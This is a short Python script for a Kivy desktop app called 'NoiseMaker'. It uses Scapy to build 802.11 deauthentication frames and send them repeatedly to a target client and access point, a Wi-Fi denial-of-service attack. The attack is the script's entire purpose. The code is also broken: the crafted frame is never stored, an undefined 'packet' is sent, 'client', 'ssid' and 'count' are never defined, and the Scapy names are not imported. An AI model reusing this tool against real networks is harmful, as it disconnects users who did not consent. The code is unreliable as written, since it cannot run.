import sys
import scapy
import kivy
kivy.require("1.9.0")

from kivy.app import App
from kivy.uix.gridlayout import GridLayout

class NoiseMakerFunc(GridLayout):
    def SendPacket (self,deauthpacket):  
        if deauthpacket:
            try:
                RadioTap()/Dot11(type=0,subtype=12,addr1=client,addr2=ssid,addr3=ssid)/Dot11Deauth(reason=7)
                for n in range(int(count)):
                    sendp(packet)
                    print 'Deauth sent via: ' + conf.iface + ' to BSSID: ' + ssid + ' for Client: ' + client
            except Exception:
                self.display.text = "error"

class NoiseMakerApp(App):

    def build(self):
        return NoiseMakerFunc()
    
NoiseMaker = NoiseMakerApp()
NoiseMaker.run()